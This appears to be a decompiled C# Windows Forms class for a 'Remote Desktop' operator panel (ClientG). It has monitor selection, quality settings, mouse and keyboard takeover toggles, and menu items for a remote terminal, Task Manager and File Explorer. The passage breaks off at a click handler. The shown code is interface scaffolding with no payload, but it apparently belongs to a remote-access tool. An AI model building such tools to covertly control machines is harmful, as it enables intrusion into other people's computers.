using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class RDGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("FE")]
	private ContextMenuStrip _FE;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("CO")]
	private Panel _CO;

	[AccessedThroughProperty("SA")]
	private Button _SA;

	[AccessedThroughProperty("DL")]
	private Button _DL;

	[AccessedThroughProperty("MN")]
	private Button _MN;

	[AccessedThroughProperty("Q")]
	private ComboBox _Q;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("KE")]
	private Button _KE;

	[AccessedThroughProperty("M")]
	private Button _M;

	[AccessedThroughProperty("D")]
	private ComboBox _D;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("ST")]
	private Button _ST;

	[AccessedThroughProperty("OpenTerminalToolStripMenuItem")]
	private ToolStripMenuItem _OpenTerminalToolStripMenuItem;

	[AccessedThroughProperty("OpenTaskManagerToolStripMenuItem")]
	private ToolStripMenuItem _OpenTaskManagerToolStripMenuItem;

	[AccessedThroughProperty("OpenFileExplorerToolStripMenuItem")]
	private ToolStripMenuItem _OpenFileExplorerToolStripMenuItem;

	[AccessedThroughProperty("P1")]
	private PictureBox _P1;

	[AccessedThroughProperty("Progressbar1")]
	private VerticalProgressbar _Progressbar1;

	[AccessedThroughProperty("SH")]
	private Button _SH;

	[AccessedThroughProperty("VerticalProgressbar1")]
	private VerticalProgressbar _VerticalProgressbar1;

	public int sock;

	public string FolderSavePic;

	public string Log;

	public Point op;

	private Point PO;

	public Size Sz;

	public string T;

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual ContextMenuStrip FE
	{
		[DebuggerNonUserCode]
		get
		{
			return _FE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_FE = value;
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel3 = value;
		}
	}

	internal virtual Panel CO
	{
		[DebuggerNonUserCode]
		get
		{
			return _CO;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CO = value;
		}
	}

	internal virtual Button SA
	{
		[DebuggerNonUserCode]
		get
		{
			return _SA;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SA_Click;
			if (_SA != null)
			{
				((Control)_SA).remove_Click(eventHandler);
			}
			_SA = value;
			if (_SA != null)
			{
				((Control)_SA).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button DL
	{
		[DebuggerNonUserCode]
		get
		{
			return _DL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DL_Click;
			if (_DL != null)
			{
				((Control)_DL).remove_Click(eventHandler);
			}
			_DL = value;
			if (_DL != null)
			{
				((Control)_DL).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button MN
	{
		[DebuggerNonUserCode]
		get
		{
			return _MN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = MN_Click;
			if (_MN != null)
			{
				((Control)_MN).remove_Click(eventHandler);
			}
			_MN = value;
			if (_MN != null)
			{
				((Control)_MN).add_Click(eventHandler);
			}
		}
	}

	internal virtual ComboBox Q
	{
		[DebuggerNonUserCode]
		get
		{
			return _Q;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Q_SelectedIndexChanged;
			if (_Q != null)
			{
				_Q.remove_SelectedIndexChanged(eventHandler);
			}
			_Q = value;
			if (_Q != null)
			{
				_Q.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Button KE
	{
		[DebuggerNonUserCode]
		get
		{
			return _KE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(KE_KeyDown);
			EventHandler eventHandler = KE_Click;
			if (_KE != null)
			{
				((Control)_KE).remove_KeyDown(val);
				((Control)_KE).remove_Click(eventHandler);
			}
			_KE = value;
			if (_KE != null)
			{
				((Control)_KE).add_KeyDown(val);
				((Control)_KE).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button M
	{
		[DebuggerNonUserCode]
		get
		{
			return _M;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = M_Click;
			if (_M != null)
			{
				((Control)_M).remove_Click(eventHandler);
			}
			_M = value;
			if (_M != null)
			{
				((Control)_M).add_Click(eventHandler);
			}
		}
	}

	internal virtual ComboBox D
	{
		[DebuggerNonUserCode]
		get
		{
			return _D;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_D = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button ST
	{
		[DebuggerNonUserCode]
		get
		{
			return _ST;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ST_Click;
			if (_ST != null)
			{
				((Control)_ST).remove_Click(eventHandler);
			}
			_ST = value;
			if (_ST != null)
			{
				((Control)_ST).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem OpenTerminalToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _OpenTerminalToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = OpenTerminalToolStripMenuItem_Click;
			if (_OpenTerminalToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenTerminalToolStripMenuItem).remove_Click(eventHandler);
			}
			_OpenTerminalToolStripMenuItem = value;
			if (_OpenTerminalToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenTerminalToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem OpenTaskManagerToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _OpenTaskManagerToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = OpenTaskManagerToolStripMenuItem_Click;
			if (_OpenTaskManagerToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenTaskManagerToolStripMenuItem).remove_Click(eventHandler);
			}
			_OpenTaskManagerToolStripMenuItem = value;
			if (_OpenTaskManagerToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenTaskManagerToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem OpenFileExplorerToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _OpenFileExplorerToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = OpenFileExplorerToolStripMenuItem_Click;
			if (_OpenFileExplorerToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenFileExplorerToolStripMenuItem).remove_Click(eventHandler);
			}
			_OpenFileExplorerToolStripMenuItem = value;
			if (_OpenFileExplorerToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenFileExplorerToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	public virtual PictureBox P1
	{
		[DebuggerNonUserCode]
		get
		{
			return _P1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(P1_MouseUp);
			MouseEventHandler val2 = new MouseEventHandler(P1_MouseMove);
			MouseEventHandler val3 = new MouseEventHandler(P1_MouseDown);
			EventHandler eventHandler = P1_DoubleClick;
			if (_P1 != null)
			{
				((Control)_P1).remove_MouseUp(val);
				((Control)_P1).remove_MouseMove(val2);
				((Control)_P1).remove_MouseDown(val3);
				((Control)_P1).remove_DoubleClick(eventHandler);
			}
			_P1 = value;
			if (_P1 != null)
			{
				((Control)_P1).add_MouseUp(val);
				((Control)_P1).add_MouseMove(val2);
				((Control)_P1).add_MouseDown(val3);
				((Control)_P1).add_DoubleClick(eventHandler);
			}
		}
	}

	internal virtual VerticalProgressbar Progressbar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Progressbar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Progressbar1 = value;
		}
	}

	internal virtual Button SH
	{
		[DebuggerNonUserCode]
		get
		{
			return _SH;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SH_Click;
			if (_SH != null)
			{
				((Control)_SH).remove_Click(eventHandler);
			}
			_SH = value;
			if (_SH != null)
			{
				((Control)_SH).add_Click(eventHandler);
			}
		}
	}

	internal virtual VerticalProgressbar VerticalProgressbar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _VerticalProgressbar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_VerticalProgressbar1 = value;
		}
	}

	public RDGR()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(RD_FormClosing));
		((Control)this).add_Resize((EventHandler)RD_Resize);
		((Form)this).add_Load((EventHandler)RD_Load);
		__ENCAddToList(this);
		ref Point reference = ref op;
		reference = new Point(1, 1);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0f15: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f1f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(RDGR));
		ImageList1 = new ImageList(components);
		FE = new ContextMenuStrip(components);
		OpenTerminalToolStripMenuItem = new ToolStripMenuItem();
		OpenTaskManagerToolStripMenuItem = new ToolStripMenuItem();
		OpenFileExplorerToolStripMenuItem = new ToolStripMenuItem();
		Panel2 = new Panel();
		VerticalProgressbar1 = new VerticalProgressbar();
		Panel3 = new Panel();
		CO = new Panel();
		SH = new Button();
		SA = new Button();
		DL = new Button();
		MN = new Button();
		Q = new ComboBox();
		KE = new Button();
		M = new Button();
		D = new ComboBox();
		Label1 = new Label();
		ST = new Button();
		Label2 = new Label();
		P1 = new PictureBox();
		((Control)FE).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((Control)CO).SuspendLayout();
		((ISupportInitialize)P1).BeginInit();
		((Control)this).SuspendLayout();
		ImageList1.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList1.ImageStream"));
		ImageList1.set_TransparentColor(Color.Transparent);
		ImageList1.get_Images().SetKeyName(0, "1483926247_Computer On.png");
		ImageList1.get_Images().SetKeyName(1, "1483926156_Monitor Off.png");
		ImageList1.get_Images().SetKeyName(2, "1483927059_mouse.png");
		ImageList1.get_Images().SetKeyName(3, "1483927040_mouse_add.png");
		ImageList1.get_Images().SetKeyName(4, "1483927216_keyboard.png");
		ImageList1.get_Images().SetKeyName(5, "1483927206_keyboard_add.png");
		ImageList1.get_Images().SetKeyName(6, "1483927682_screen-full.png");
		ImageList1.get_Images().SetKeyName(7, "1483927660_screen-normal.png");
		ImageList1.get_Images().SetKeyName(8, "1483927925_Menu_icon.png");
		ImageList1.get_Images().SetKeyName(9, "1483928010_save_32.png");
		ImageList1.get_Images().SetKeyName(10, "1483928189_application_windows_add.png");
		ImageList1.get_Images().SetKeyName(11, "1483928184_application_windows_remove.png");
		ImageList1.get_Images().SetKeyName(12, "1483929726_Black-Task-Manager.png");
		ImageList1.get_Images().SetKeyName(13, "1483929634_folder_explorer.png");
		ImageList1.get_Images().SetKeyName(14, "1483929565_cmd.png");
		ImageList1.get_Images().SetKeyName(15, "1483932655_save_add.png");
		((ToolStrip)FE).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)OpenTerminalToolStripMenuItem,
			(ToolStripItem)OpenTaskManagerToolStripMenuItem,
			(ToolStripItem)OpenFileExplorerToolStripMenuItem
		});
		((Control)FE).set_Name("FE");
		ContextMenuStrip fE = FE;
		Size size = new Size(180, 70);
		((Control)fE).set_Size(size);
		((ToolStripItem)OpenTerminalToolStripMenuItem).set_Image((Image)(object)Resources._1483929565_cmd);
		((ToolStripItem)OpenTerminalToolStripMenuItem).set_Name("OpenTerminalToolStripMenuItem");
		ToolStripMenuItem openTerminalToolStripMenuItem = OpenTerminalToolStripMenuItem;
		size = new Size(179, 22);
		((ToolStripItem)openTerminalToolStripMenuItem).set_Size(size);
		((ToolStripItem)OpenTerminalToolStripMenuItem).set_Text("Open Terminal");
		((ToolStripItem)OpenTaskManagerToolStripMenuItem).set_Image((Image)(object)Resources._1483929726_Black_Task_Manager);
		((ToolStripItem)OpenTaskManagerToolStripMenuItem).set_Name("OpenTaskManagerToolStripMenuItem");
		ToolStripMenuItem openTaskManagerToolStripMenuItem = OpenTaskManagerToolStripMenuItem;
		size = new Size(179, 22);
		((ToolStripItem)openTaskManagerToolStripMenuItem).set_Size(size);
		((ToolStripItem)OpenTaskManagerToolStripMenuItem).set_Text("Open Task Manager");
		((ToolStripItem)OpenFileExplorerToolStripMenuItem).set_Image((Image)(object)Resources._1483929634_folder_explorer);
		((ToolStripItem)OpenFileExplorerToolStripMenuItem).set_Name("OpenFileExplorerToolStripMenuItem");
		ToolStripMenuItem openFileExplorerToolStripMenuItem = OpenFileExplorerToolStripMenuItem;
		size = new Size(179, 22);
		((ToolStripItem)openFileExplorerToolStripMenuItem).set_Size(size);
		((ToolStripItem)OpenFileExplorerToolStripMenuItem).set_Text("Open File Explorer");
		((Control)Panel2).get_Controls().Add((Control)(object)VerticalProgressbar1);
		((Control)Panel2).set_Dock((DockStyle)3);
		Panel panel = Panel2;
		Point location = new Point(0, 0);
		((Control)panel).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel2 = Panel2;
		size = new Size(13, 386);
		((Control)panel2).set_Size(size);
		((Control)Panel2).set_TabIndex(3);
		((Control)VerticalProgressbar1).set_Dock((DockStyle)5);
		VerticalProgressbar verticalProgressbar = VerticalProgressbar1;
		location = new Point(0, 0);
		((Control)verticalProgressbar).set_Location(location);
		((Control)VerticalProgressbar1).set_Name("VerticalProgressbar1");
		VerticalProgressbar verticalProgressbar2 = VerticalProgressbar1;
		size = new Size(13, 386);
		((Control)verticalProgressbar2).set_Size(size);
		((Control)VerticalProgressbar1).set_TabIndex(4);
		((Control)Panel3).get_Controls().Add((Control)(object)CO);
		((Control)Panel3).get_Controls().Add((Control)(object)P1);
		((Control)Panel3).set_Dock((DockStyle)5);
		Panel panel3 = Panel3;
		location = new Point(13, 0);
		((Control)panel3).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel4 = Panel3;
		size = new Size(839, 386);
		((Control)panel4).set_Size(size);
		((Control)Panel3).set_TabIndex(4);
		((Control)CO).set_Anchor((AnchorStyles)1);
		((Control)CO).set_BackColor(Color.Transparent);
		((Control)CO).get_Controls().Add((Control)(object)SH);
		((Control)CO).get_Controls().Add((Control)(object)SA);
		((Control)CO).get_Controls().Add((Control)(object)DL);
		((Control)CO).get_Controls().Add((Control)(object)MN);
		((Control)CO).get_Controls().Add((Control)(object)Q);
		((Control)CO).get_Controls().Add((Control)(object)KE);
		((Control)CO).get_Controls().Add((Control)(object)M);
		((Control)CO).get_Controls().Add((Control)(object)D);
		((Control)CO).get_Controls().Add((Control)(object)Label1);
		((Control)CO).get_Controls().Add((Control)(object)ST);
		((Control)CO).get_Controls().Add((Control)(object)Label2);
		Panel cO = CO;
		location = new Point(168, 3);
		((Control)cO).set_Location(location);
		((Control)CO).set_Name("CO");
		Panel cO2 = CO;
		size = new Size(503, 35);
		((Control)cO2).set_Size(size);
		((Control)CO).set_TabIndex(3);
		((Control)SH).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)SH).set_FlatStyle((FlatStyle)1);
		((ButtonBase)SH).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)SH).set_ImageIndex(10);
		((ButtonBase)SH).set_ImageList(ImageList1);
		Button sH = SH;
		location = new Point(464, 3);
		((Control)sH).set_Location(location);
		((Control)SH).set_Name("SH");
		Button sH2 = SH;
		size = new Size(31, 29);
		((Control)sH2).set_Size(size);
		((Control)SH).set_TabIndex(10);
		((Control)SH).set_Tag((object)"0");
		((ButtonBase)SH).set_TextAlign((ContentAlignment)1);
		((ButtonBase)SH).set_TextImageRelation((TextImageRelation)1);
		((ButtonBase)SH).set_UseVisualStyleBackColor(true);
		((Control)SA).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)SA).set_FlatStyle((FlatStyle)1);
		((ButtonBase)SA).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)SA).set_ImageIndex(15);
		((ButtonBase)SA).set_ImageList(ImageList1);
		Button sA = SA;
		location = new Point(430, 3);
		((Control)sA).set_Location(location);
		((Control)SA).set_Name("SA");
		Button sA2 = SA;
		size = new Size(31, 29);
		((Control)sA2).set_Size(size);
		((Control)SA).set_TabIndex(9);
		((Control)SA).set_Tag((object)"0");
		((ButtonBase)SA).set_TextAlign((ContentAlignment)1);
		((ButtonBase)SA).set_TextImageRelation((TextImageRelation)1);
		((ButtonBase)SA).set_UseVisualStyleBackColor(true);
		((Control)DL).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)DL).set_FlatStyle((FlatStyle)1);
		((ButtonBase)DL).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)DL).set_ImageIndex(8);
		((ButtonBase)DL).set_ImageList(ImageList1);
		Button dL = DL;
		location = new Point(396, 3);
		((Control)dL).set_Location(location);
		((Control)DL).set_Name("DL");
		Button dL2 = DL;
		size = new Size(31, 29);
		((Control)dL2).set_Size(size);
		((Control)DL).set_TabIndex(8);
		((ButtonBase)DL).set_TextAlign((ContentAlignment)1);
		((ButtonBase)DL).set_TextImageRelation((TextImageRelation)1);
		((ButtonBase)DL).set_UseVisualStyleBackColor(true);
		((Control)MN).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)MN).set_FlatStyle((FlatStyle)1);
		((ButtonBase)MN).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)MN).set_ImageIndex(6);
		((ButtonBase)MN).set_ImageList(ImageList1);
		Button mN = MN;
		location = new Point(362, 3);
		((Control)mN).set_Location(location);
		((Control)MN).set_Name("MN");
		Button mN2 = MN;
		size = new Size(31, 29);
		((Control)mN2).set_Size(size);
		((Control)MN).set_TabIndex(7);
		((Control)MN).set_Tag((object)"0");
		((ButtonBase)MN).set_TextAlign((ContentAlignment)1);
		((ButtonBase)MN).set_TextImageRelation((TextImageRelation)1);
		((ButtonBase)MN).set_UseVisualStyleBackColor(true);
		Q.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)Q).set_FormattingEnabled(true);
		Q.get_Items().AddRange(new object[10] { "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%" });
		ComboBox q = Q;
		location = new Point(311, 8);
		((Control)q).set_Location(location);
		((Control)Q).set_Name("Q");
		ComboBox q2 = Q;
		size = new Size(45, 21);
		((Control)q2).set_Size(size);
		((Control)Q).set_TabIndex(6);
		((Control)KE).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)KE).set_FlatStyle((FlatStyle)1);
		((ButtonBase)KE).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)KE).set_ImageIndex(5);
		((ButtonBase)KE).set_ImageList(ImageList1);
		Button kE = KE;
		location = new Point(236, 3);
		((Control)kE).set_Location(location);
		((Control)KE).set_Name("KE");
		Button kE2 = KE;
		size = new Size(31, 29);
		((Control)kE2).set_Size(size);
		((Control)KE).set_TabIndex(4);
		((Control)KE).set_Tag((object)"0");
		((ButtonBase)KE).set_TextAlign((ContentAlignment)1);
		((ButtonBase)KE).set_TextImageRelation((TextImageRelation)1);
		((ButtonBase)KE).set_UseVisualStyleBackColor(true);
		((Control)M).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)M).set_FlatStyle((FlatStyle)1);
		((ButtonBase)M).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)M).set_ImageIndex(3);
		((ButtonBase)M).set_ImageList(ImageList1);
		Button m = M;
		location = new Point(201, 3);
		((Control)m).set_Location(location);
		((Control)M).set_Name("M");
		Button m2 = M;
		size = new Size(31, 29);
		((Control)m2).set_Size(size);
		((Control)M).set_TabIndex(3);
		((Control)M).set_Tag((object)"0");
		((ButtonBase)M).set_TextAlign((ContentAlignment)1);
		((ButtonBase)M).set_TextImageRelation((TextImageRelation)1);
		((ButtonBase)M).set_UseVisualStyleBackColor(true);
		D.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)D).set_FormattingEnabled(true);
		ComboBox d = D;
		location = new Point(91, 8);
		((Control)d).set_Location(location);
		((Control)D).set_Name("D");
		ComboBox d2 = D;
		size = new Size(104, 21);
		((Control)d2).set_Size(size);
		((Control)D).set_TabIndex(2);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(42, 11);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(48, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Monitor :");
		((Control)ST).set_BackgroundImageLayout((ImageLayout)3);
		((ButtonBase)ST).set_FlatStyle((FlatStyle)1);
		((ButtonBase)ST).set_ImageAlign((ContentAlignment)16);
		((ButtonBase)ST).set_ImageIndex(0);
		((ButtonBase)ST).set_ImageList(ImageList1);
		Button sT = ST;
		location = new Point(7, 3);
		((Control)sT).set_Location(location);
		((Control)ST).set_Name("ST");
		Button sT2 = ST;
		size = new Size(31, 29);
		((Control)sT2).set_Size(size);
		((Control)ST).set_TabIndex(0);
		((Control)ST).set_Tag((object)"0");
		((ButtonBase)ST).set_TextAlign((ContentAlignment)1);
		((ButtonBase)ST).set_TextImageRelation((TextImageRelation)1);
		((ButtonBase)ST).set_UseVisualStyleBackColor(true);
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(268, 11);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(45, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Quality :");
		((Control)P1).set_BackColor(Color.Black);
		((Control)P1).set_Dock((DockStyle)5);
		PictureBox p = P1;
		location = new Point(0, 0);
		((Control)p).set_Location(location);
		((Control)P1).set_Name("P1");
		PictureBox p2 = P1;
		size = new Size(839, 386);
		((Control)p2).set_Size(size);
		P1.set_SizeMode((PictureBoxSizeMode)1);
		P1.set_TabIndex(2);
		P1.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(852, 386);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Panel3);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("RDGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Remote Desktop");
		((Control)FE).ResumeLayout(false);
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((Control)CO).ResumeLayout(false);
		((Control)CO).PerformLayout();
		((ISupportInitialize)P1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vkey);

	private void DL_Click(object sender, EventArgs e)
	{
		try
		{
			((ToolStripDropDown)FE).Show((Control)(object)DL, 0, ((Control)DL).get_Height());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void KE_Click(object sender, EventArgs e)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(((Control)ST).get_Tag(), (object)"1", false))
			{
				if (Operators.ConditionalCompareObjectEqual(((Control)KE).get_Tag(), (object)"0", false))
				{
					((Control)KE).set_Tag((object)"1");
					((ButtonBase)KE).set_Image(ImageList1.get_Images().get_Item(5));
					return;
				}
				((Control)KE).set_Tag((object)"0");
				((Control)CO).set_Visible(true);
				((Control)SH).Focus();
				((ButtonBase)KE).set_Image(ImageList1.get_Images().get_Item(4));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MN_Click(object sender, EventArgs e)
